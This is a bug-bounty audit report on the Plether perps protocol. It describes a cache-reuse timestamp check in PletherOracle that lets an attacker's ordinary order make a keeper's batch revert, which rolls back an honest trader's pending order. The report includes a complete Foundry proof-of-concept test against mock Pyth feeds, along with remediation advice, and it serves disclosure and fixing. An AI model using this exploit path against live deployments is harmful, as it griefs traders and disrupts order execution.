# \#98356 [SC-Medium] Valid skewed Pyth basket is rejected on batch cache reuse, reverting earlier order execution

**Submitted on Nov 7th 2026 at 08:43:51 UTC by @Ox175 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98356
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Executive Summary

An honest trader has a pending, executable FIFO order. An ordinary attacker then uses public `commitOrder` to add the next order before an honest keeper's two-slot batch. With the same valid historical Pyth basket and keeper rule, the victim's order executes when it is alone, but the batch reverts when the attacker's order makes the Router reuse that basket. On reuse, `PletherOracle` asks every stored feed to cover the basket's **newest** component time. One component was validly published one second earlier and remains stored at that earlier time, so the Oracle raises `PletherOracle__StoredFeedBehind`. The Router propagates the error out of `executeOrderBatch`, rolling back the victim's execution and leaving that order pending.

I checked the frozen competition source at `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, the v2.0.0 deployment source named in its manifest, and the supplied Foundry PoC. The Oracle and execution-sidecar source in the test checkout match the frozen scoped files byte for byte. A focused Foundry run passed 6/6 tests, including the snapshot-controlled attacker/no-attacker comparison and controls for equal-time updates, first-item execution, already-newer stored feeds, and separate single-order execution. The demonstrated victim effect is a rolled-back execution attempt and a still-pending order. It is not a demonstrated transfer of funds, a prolonged freeze, or quantified keeper gas loss.

The v2.0.0 Arbitrum Sepolia release manifest pins source `1209ca8a`; that snapshot and the frozen competition snapshot both contain the affected check. The earlier v1.3.1 tag has the old cache timestamp meaning and does not have this specific mismatch. v2.0.0 is the earliest affected release I verified, rather than a claim about every intervening build. I found no fixed release in the inspected source history.

## Background

`OrderRouter.executeOrderBatch(maxOrderId, pythUpdateData)` is a permissionless keeper entry point for consecutive orders in the global FIFO. The Router begins each call with an empty in-memory basket cache. A successful historical parse for order 1 can supply the cache for a later order whose commit time falls inside the same basket's coverage. The public Router does not accept a caller-supplied cache; it passes the Oracle's own previous result through the batch. In the comparison, Alice is the honest victim, Bob is an ordinary attacker who can submit his own order, and a separate keeper follows the same two-slot FIFO rule in both branches.

The historical parser accepts a basket whose component publish times differ by at most `maxComponentPublishTimeDivergence`, which is five seconds in the checked source (`packages/perps/src/PletherOracle.sol`, `_resolveHistoricalOrderBasket` and `_computeBasketPriceFromFeeds`). A successful parse calls `pyth.updatePriceFeeds` and then checks each parsed feed against **that feed's own** parsed publish time. A feed that was already newer in storage also satisfies this check. Unequal component times alone do not imply the later cache failure: it requires at least one stored feed to remain behind the basket's newest component time.

## Vulnerability Details

For the concrete PoC, Alice commits order 1 at `t`. Bob's public action is to commit order 2 at `t + 3`, while Alice's order remains pending. The keeper executes at `t + 6`. All six feed updates are at `t + 5` except one at `t + 4`. Both component times follow both commits, fall within the order settlement windows, and differ by only one second. Before execution, the mock stored feeds are at `t`, so the older feed's stored timestamp becomes `t + 4` after the first parse and update. The first order passes its per-feed coverage checks and supplies a cached basket with `publishTime = t + 5` and `oldestPublishTime = t + 4`.

The keeper rule is fixed: take the FIFO head and at most one successor, capping `maxOrderId` at the latest committed ID as `_validateBatchBounds` requires. A snapshot after Alice's commit keeps her order, stored feed state, signed-data-shaped payload, funding, and keeper procedure the same. Without Bob's commit, the keeper's cap is order 1; the batch succeeds and marks Alice's order `Executed`. Restore the snapshot, let Bob commit at `t + 3`, and use the same payload at `t + 6`: the cap is order 2, the first item executes inside the call, and the second-item cache check reverts the keeper call. Transaction atomicity leaves Alice's order `Pending`, no Alice position, and the FIFO head still at order 1. Bob changes neither Alice's order nor the Oracle data; his order is what makes the same keeper rule enter the defective reuse path.

In the frozen source, `_computeBasketPriceFromFeeds` accepts this spread and records the newest and oldest component times separately (`packages/perps/src/PletherOracle.sol:856-875`):

```solidity
if (maxPublishTime > minPublishTime + maxPublishTimeDivergence) {
    revert PletherOracle__PublishTimeDivergence(mode, minPublishTime, maxPublishTime, maxPublishTimeDivergence);
}
```

Later in that function:

```solidity
basket.publishTime = uint64(maxPublishTime);
basket.oldestPublishTime = uint64(minPublishTime);
```

Both the Router and Oracle require Bob's commit time to precede `cache.oldestPublishTime`, so the second item takes the cache-reuse branch (`PletherOracle.sol:974-991`, `OrderRouterExecutionSidecar.sol:1074-1093`). That branch uses the wrong threshold for every configured feed (`PletherOracle.sol:263-266`):

```solidity
for (uint256 i; i < pythFeedIds.length; ++i) {
    _requireStoredFeedCoverage(pythFeedIds[i], cache.publishTime);
}
```

`_requireStoredFeedCoverage` compares `pyth.getPriceUnsafe(feedId).publishTime` with the supplied threshold and reverts if storage is lower (`PletherOracle.sol:645-653`). Here the older feed has stored time `t + 4`, while `cache.publishTime` is `t + 5`. The cache came from the Oracle's own successful parse, yet reusing it raises `PletherOracle__StoredFeedBehind(olderFeed, t + 4, t + 5)`. If storage for every feed had already reached `t + 5` or later, this particular check would pass despite unequal parsed component times.

`StoredFeedBehind` has three arguments and 100 bytes of ABI-encoded revert data. `_prepareBatchOracle` catches only a 68-byte `PletherOracle__HistoricalParserFailure`; it rethrows this error from the outer batch preparation frame (`OrderRouterExecutionSidecar.sol:1009-1030`). Ethereum transaction atomicity then undoes Alice's apparent first-item execution as well as Bob's, leaving both orders pending. This is a failure in the public batch route, not merely in the Oracle's lower-level helper.

The mismatch entered with commit `81919218` (#120), which changed `basket.publishTime` from the oldest to the newest component time and added `oldestPublishTime`. The commit updated the reuse eligibility predicate to consult the new oldest field, but the per-feed storage coverage loop continued to consult `cache.publishTime`. The prior v1.3.1 source uses the oldest time for that loop, so this exact false rejection is absent there.

The documentation explains that Oracle preparation failures can revert a whole batch. `packages/perps/ORACLE_SYNCHRONIZATION.md` even lists `StoredFeedBehind` among errors with that consequence, and `packages/perps/SECURITY.md` says other Oracle/Pyth preparation failures remain batch atomic. Those statements describe error handling. They do not disclose that a basket explicitly accepted by the five-second divergence rule can trigger `StoredFeedBehind` when the Router reuses its own cache. The stated cache policy says later orders may reuse a basket when its components cover their commits; the one-second example satisfies that policy.

## Exploitability Analysis

The narrow demonstrated effect is cross-party griefing: Bob's ordinary order submission makes Alice's otherwise executable order remain pending after the honest keeper's batch attempt. The impact is conditional on cache reuse and on at least one stored feed being behind the cached newest component time. A keeper can instead execute orders individually, or a batch may succeed when all stored feeds already cover the newest time. The PoC does not establish persistent freezing of capital, accounting corruption, a guaranteed outage across all valid Pyth payloads, or a measured financial gas loss.

Bob does not control the keeper or forge Pyth timestamps. He commits before the next usable historical updates, so his order is eligible for the same basket as Alice's. Pyth's [Hermes historical-update API](https://docs.pyth.network/api-reference/hermes/price-updates-at-time) returns the first update at or after a requested time for each feed, with a `publish_time` on each returned feed; the project's `SECURITY.md` explicitly notes that feeds publish at different times. Thus a one-second cross-feed gap can arise from genuine published updates, and the Oracle's five-second divergence allowance expressly admits it. The attacker needs a reachable skewed interval, not a power to dictate signed timestamps or to force every keeper to batch. The test uses `MockPyth`, which models that allowed timing and the Router/Oracle state transitions; it does not include a captured, cryptographically verified six-feed Hermes bundle. This limits claims about frequency, but the unchanged-payload comparison establishes the attacker-order-to-victim-pending path when such an interval occurs.

## Proof of Concept

The complete Solidity PoC is embedded below. Save the code block as `packages/perps/test/solar-poc/BatchReuseCoverageDoS.t.sol` in a checkout of the frozen commit. It runs against the unmodified scoped contracts, using the repository's six-feed `MockPyth` and mock settlement token. Its `_riskParams` override aligns the VPI and margin rates with the v2.0.0 deployment manifest; the other Engine risk fields already match. The inherited Router defaults and test liquidity are not a full deployment replica. Under those same settings, the first order executes in a bounded batch and both orders execute in the equal-time batch and separate single-order controls. Those differences therefore do not explain the second-item `StoredFeedBehind` failure. Run from the checkout root:

```sh
cd packages/perps
forge test --offline --match-path test/solar-poc/BatchReuseCoverageDoS.t.sol -vv
```

The focused run against the frozen scoped contracts passed 6/6 tests. `test_AttackerAddsOrderAndRollsBackHonestVictim` snapshots after Alice commits, invokes the same keeper policy and same skewed payload on both branches, and checks that Alice is `Executed` without Bob's action but remains `Pending` with no position after Bob's public commit. It asserts the precise `StoredFeedBehind(olderFeed, t + 4, t + 5)` revert from the keeper call. `test_BatchRevertsOnPermittedComponentSkew` checks the underlying two-order failure. `test_FirstSkewedBatchItemExecutesWhenBoundedToOne` proves the same skewed basket can execute the first item through the batch entry point. `test_EqualLegsBatchSucceeds` executes both orders with equal component times. `test_NewerStoredFeedAllowsSkewedBatch` shows skew alone is insufficient when storage already covers the newest time. `test_SkewedOrdersExecuteIndividually` executes the same two orders with the skewed historical tick in separate calls. No keeper transaction gas receipt is measured; Foundry's test gas figures are harness measurements.

### Complete runnable PoC: `packages/perps/test/solar-poc/BatchReuseCoverageDoS.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {OracleSynchronizationTestBase} from "../perps/shared/OracleSynchronizationTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice End-to-end reproduction of the batch-reuse feed-coverage check using the newest leg
///         instead of the cache's oldest leg. A valid basket with 1-5s component skew makes the
///         second order in an otherwise valid batch revert and rolls back the first order.
contract SolarBatchReuseCoverageDoSTest is OracleSynchronizationTestBase {
    address internal constant KEEPER = address(0xBEEF);

    // Match the v2.0.0 Arbitrum Sepolia manifest. BasePerpTest uses different margin
    // and VPI parameters; neither should be needed to trigger the Oracle failure.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1_000_000,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _skewedPayload(uint64 newest, uint64 previous) internal pure returns (bytes[] memory historical) {
        historical = _payload(newest, previous);
        MockPyth.FeedUpdate[] memory updates = abi.decode(historical[0], (MockPyth.FeedUpdate[]));
        updates[0].price.publishTime = newest - 1;
        historical[0] = abi.encode(updates);
    }

    /// @notice Keeper policy: execute at most two consecutive FIFO orders, stopping at the
    ///         latest committed ID. Both branches below use this exact procedure and payload.
    function _keeperTwoSlotBatch(bytes[] memory historical) internal returns (bool ok, bytes memory returnData) {
        uint64 head = router.nextExecuteId();
        uint64 lastCommitted = router.nextCommitId() - 1;
        uint64 maxOrderId = head + 1;
        if (maxOrderId > lastCommitted) maxOrderId = lastCommitted;
        vm.prank(KEEPER);
        (ok, returnData) = address(router).call{value: 4 * FEE, gas: KEEPER_GAS_CAP}(
            abi.encodeWithSelector(router.executeOrderBatch.selector, maxOrderId, historical)
        );
    }

    /// @notice Alice's order is already pending when Bob publicly commits a second order.
    ///         The same valid skewed Oracle payload and keeper policy succeed without Bob and
    ///         revert with him, rolling Alice's otherwise executable order back to Pending.
    function test_AttackerAddsOrderAndRollsBackHonestVictim() public {
        uint64 firstCommit = uint64(block.timestamp);
        uint64 victimId = _commit(ALICE, 0);
        assertEq(victimId, 1);
        baseMockPyth.setAllPrices(_synchronizationFeedIds(), 100_000_000, -8, firstCommit);
        vm.deal(KEEPER, 1 ether);
        bytes[] memory historical = _skewedPayload(firstCommit + 5, firstCommit);
        uint256 beforeAttacker = vm.snapshotState();

        // Control: no attacker order. The keeper still checks for up to two FIFO slots,
        // but caps maxOrderId at the single committed order as the Router requires.
        _advance(firstCommit + 3);
        _advance(firstCommit + 6);
        (bool controlOk, bytes memory controlData) = _keeperTwoSlotBatch(historical);
        assertTrue(controlOk, "honest victim executes without attacker action");
        OrderV3Types.BatchResult memory control = abi.decode(controlData, (OrderV3Types.BatchResult));
        assertEq(control.terminalCount, 1);
        assertEq(uint8(_orderRecord(victimId).status), uint8(IOrderRouterAccounting.OrderStatus.Executed));

        // Restore the identical honest order, stored feed data and keeper state.
        assertTrue(vm.revertToState(beforeAttacker));
        _advance(firstCommit + 3);
        uint64 attackerId = _commit(BOB, 0); // Public commitOrder; no oracle privilege.
        assertEq(attackerId, 2);
        _advance(firstCommit + 6);
        (bool attackedOk, bytes memory attackedData) = _keeperTwoSlotBatch(historical);
        assertFalse(attackedOk, "attacker-added order makes the keeper batch revert");
        bytes32 olderFeed = _synchronizationFeedIds()[0];
        assertEq(
            attackedData,
            abi.encodeWithSelector(
                IPletherOracle.PletherOracle__StoredFeedBehind.selector,
                olderFeed,
                firstCommit + 4,
                firstCommit + 5
            )
        );
        assertEq(router.nextExecuteId(), victimId);
        assertEq(uint8(_orderRecord(victimId).status), uint8(IOrderRouterAccounting.OrderStatus.Pending));
        assertEq(uint8(_orderRecord(attackerId).status), uint8(IOrderRouterAccounting.OrderStatus.Pending));
        (uint256 victimSize,,,,,,) = engine.positions(ALICE);
        assertEq(victimSize, 0, "victim execution was rolled back");
    }

    function test_BatchRevertsOnPermittedComponentSkew() public {
        uint64 firstCommit = uint64(block.timestamp);
        _commit(ALICE, 0);
        _advance(firstCommit + 3);
        _commit(BOB, 0);
        _advance(firstCommit + 6);

        // Both commits are before the oldest leg. Legs differ by one second, inside the permitted
        // maxComponentPublishTimeDivergence = 5, so the production parser accepts the basket.
        bytes[] memory historical = _skewedPayload(firstCommit + 5, firstCommit);

        // Ensure the first order's historical update is actually applied to storage, so feed 0
        // is stored at its own older leg (firstCommit + 4) while cache.publishTime is the newest
        // leg (firstCommit + 5).
        baseMockPyth.setAllPrices(_synchronizationFeedIds(), 100_000_000, -8, firstCommit);

        bytes32[] memory ids = _synchronizationFeedIds();
        vm.expectRevert(
            abi.encodeWithSelector(
                IPletherOracle.PletherOracle__StoredFeedBehind.selector, ids[0], firstCommit + 4, firstCommit + 5
            )
        );
        router.executeOrderBatch{value: 4 * FEE}(2, historical);

        // The whole batch rolled back: neither order terminalised or opened a position.
        assertEq(router.nextExecuteId(), 1, "first order must remain pending after the batch revert");
        assertEq(uint8(_orderRecord(1).status), uint8(IOrderRouterAccounting.OrderStatus.Pending));
        assertEq(uint8(_orderRecord(2).status), uint8(IOrderRouterAccounting.OrderStatus.Pending));
        (uint256 aliceSize,,,,,,) = engine.positions(ALICE);
        (uint256 bobSize,,,,,,) = engine.positions(BOB);
        assertEq(aliceSize, 0, "first order's execution must be rolled back");
        assertEq(bobSize, 0, "second order must remain unexecuted");
    }

    /// @notice Control: identical batch with equal component legs succeeds and terminalises both orders.
    function test_EqualLegsBatchSucceeds() public {
        uint64 firstCommit = uint64(block.timestamp);
        _commit(ALICE, 0);
        _advance(firstCommit + 3);
        _commit(BOB, 0);
        _advance(firstCommit + 6);

        bytes[] memory historical = _payload(firstCommit + 5, firstCommit);
        baseMockPyth.setAllPrices(_synchronizationFeedIds(), 100_000_000, -8, firstCommit);

        OrderV3Types.BatchResult memory result = router.executeOrderBatch{value: 4 * FEE}(2, historical);
        assertEq(result.terminalCount, 2, "equal legs must allow the batch to progress");
        assertEq(result.nextOrderId, 0, "both orders terminalised");
        assertEq(uint8(_orderRecord(1).status), uint8(IOrderRouterAccounting.OrderStatus.Executed));
        assertEq(uint8(_orderRecord(2).status), uint8(IOrderRouterAccounting.OrderStatus.Executed));
    }

    /// @notice The skewed basket is valid for the first item through the batch route itself.
    function test_FirstSkewedBatchItemExecutesWhenBoundedToOne() public {
        uint64 firstCommit = uint64(block.timestamp);
        _commit(ALICE, 0);
        _advance(firstCommit + 3);
        _commit(BOB, 0);
        _advance(firstCommit + 6);
        baseMockPyth.setAllPrices(_synchronizationFeedIds(), 100_000_000, -8, firstCommit);

        OrderV3Types.BatchResult memory result =
            router.executeOrderBatch{value: 2 * FEE}(1, _skewedPayload(firstCommit + 5, firstCommit));
        assertEq(result.terminalCount, 1);
        assertEq(result.nextOrderId, 2);
        assertEq(uint8(_orderRecord(1).status), uint8(IOrderRouterAccounting.OrderStatus.Executed));
        assertEq(uint8(_orderRecord(2).status), uint8(IOrderRouterAccounting.OrderStatus.Pending));
        (uint256 aliceSize,,,,,,) = engine.positions(ALICE);
        assertGt(aliceSize, 0);
    }

    /// @notice A skewed parsed basket can be reused if storage already covers its newest leg.
    ///         The trigger requires both skew and a stored feed still behind that newest time.
    function test_NewerStoredFeedAllowsSkewedBatch() public {
        uint64 firstCommit = uint64(block.timestamp);
        _commit(ALICE, 0);
        _advance(firstCommit + 3);
        _commit(BOB, 0);
        _advance(firstCommit + 6);
        bytes32[] memory ids = _synchronizationFeedIds();
        baseMockPyth.setAllPrices(ids, 100_000_000, -8, firstCommit + 5);

        OrderV3Types.BatchResult memory result =
            router.executeOrderBatch{value: 4 * FEE}(2, _skewedPayload(firstCommit + 5, firstCommit));
        assertEq(result.terminalCount, 2);
        assertEq(result.nextOrderId, 0);
        assertEq(uint8(_orderRecord(1).status), uint8(IOrderRouterAccounting.OrderStatus.Executed));
        assertEq(uint8(_orderRecord(2).status), uint8(IOrderRouterAccounting.OrderStatus.Executed));
        assertEq(baseMockPyth.getPriceUnsafe(ids[0]).publishTime, firstCommit + 5);
    }

    /// @notice Control: the same two orders execute through separate single-order calls with
    ///         the valid skewed historical basket that the failed batch tried to reuse.
    function test_SkewedOrdersExecuteIndividually() public {
        uint64 firstCommit = uint64(block.timestamp);
        _commit(ALICE, 0);
        _advance(firstCommit + 3);
        _commit(BOB, 0);
        _advance(firstCommit + 6);
        baseMockPyth.setAllPrices(_synchronizationFeedIds(), 100_000_000, -8, firstCommit);

        OrderV3Types.ExecutionResult memory first =
            router.executeOrder{value: 2 * FEE}(1, _skewedPayload(firstCommit + 5, firstCommit));
        assertEq(uint8(first.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(router.nextExecuteId(), 2);

        _advance(firstCommit + 7);
        OrderV3Types.ExecutionResult memory second =
            router.executeOrder{value: 2 * FEE}(2, _skewedPayload(firstCommit + 5, firstCommit));
        assertEq(uint8(second.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(router.nextExecuteId(), 0);
        assertEq(uint8(_orderRecord(1).status), uint8(IOrderRouterAccounting.OrderStatus.Executed));
        assertEq(uint8(_orderRecord(2).status), uint8(IOrderRouterAccounting.OrderStatus.Executed));
    }
}
```

Validation checklist: public attacker action and separate keeper [x]; same honest order, available Oracle data, and keeper batching rule across branches [x]; exact keeper revert and victim `Pending` effect [x]; plausibility of unequal signed per-feed publish times from Pyth and project documentation [x]; captured real six-feed signed Hermes bundle [ ]. The last item limits frequency claims; it does not change what the unmodified Router and Oracle do when genuine updates have the allowed one-second gap.

## Remediation

On cache reuse, compare each stored feed with a timestamp that feed could have supplied. Comparing all feeds with `cache.oldestPublishTime` restores the pre-`#120` minimum-coverage meaning; storing and checking each feed's own parsed time would be more precise. Preserve the separate `oldestPublishTime` eligibility bound for the later order. If coverage truly fails because storage is too old, the Router can reject cache reuse and request a fresh historical resolution, but merely catching `StoredFeedBehind` after the Oracle reverts does not make the existing cache valid.

Add a regression at the public `executeOrderBatch` entry point with skewed accepted component times and an older stored feed, asserting two terminal orders; retain the equal-time and individual-execution controls, plus a case where storage already exceeds the newest component time. Verify the remedy against the same frozen-source fixture. No fixed release was identified in the inspected history.

## Summary

In the checked v2.0.0 deployment source and frozen competition source, a valid historical basket can pass the first order and then fail the Oracle's own cache coverage check for a later FIFO order. The attacker's public order makes the honest keeper's otherwise successful execution of the victim's first order take that failing reuse path. `StoredFeedBehind` escapes batch preparation and rolls back the victim's order to `Pending`. This supports conditional Medium/Griefing through an attacker-controlled action and concrete victim effect; individual execution remains a fallback. The key correction is to validate storage against the oldest or per-feed cached time while keeping the existing historical-coverage policy.
